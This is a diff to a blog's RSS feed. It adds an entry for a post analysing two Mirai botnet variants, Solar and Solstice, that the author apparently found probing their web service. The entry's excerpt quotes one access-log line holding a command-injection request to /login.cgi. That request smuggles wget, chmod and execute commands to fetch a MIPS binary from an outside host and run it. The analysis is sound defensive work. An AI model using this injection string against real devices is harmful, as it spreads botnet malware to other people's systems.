@@ -23,6 +23,17 @@ I&amp;rsquo;ve been around the tech industry block a few times now, first as a Q
     </item>
     
     <item>
+      <title>Solar and Solstice - Two Mirai Variants</title>
+      <link>http://blog.race-conditions.net/posts/solar-and-solstice-two-mirai-variants/</link>
+      <pubDate>Mon, 22 Apr 2019 16:18:52 +0200</pubDate>
+      
+      <guid>http://blog.race-conditions.net/posts/solar-and-solstice-two-mirai-variants/</guid>
+      <description>Notes on Solar and Solstice binaries.
+Strange Visitors in the Access Logs A few days (or maybe it was weeks), after I launched a public facing web service (a visual colour search engine I wrote a bit more about in this post) I started seeing some strange entries in the access logs.
+&amp;quot;&amp;lt;source ip redacted&amp;gt; - - [20/Apr/2019:14:11:03 +0000] &amp;quot;GET /login.cgi?cli=aa%20aa%27; wget%20http://&amp;lt;compromised host redacted&amp;gt;/bins/Rep.mips%20-O%20-&amp;gt;%20/tmp/.Solar; chmod%20777%20/tmp/.Solar;/tmp/.Solar%20Dlink.mips%27$ HTTP/1.1&amp;quot; 404 233 &amp;quot;-&amp;quot; &amp;quot;Solar/9.</description>
+    </item>
+    
+    <item>
       <title>Building a Visual Lipcolour Search Engine</title>
       <link>http://blog.race-conditions.net/posts/building-a-visual-lipcolour-search-engine/</link>
       <pubDate>Wed, 09 Jan 2019 17:58:59 +0000</pubDate>
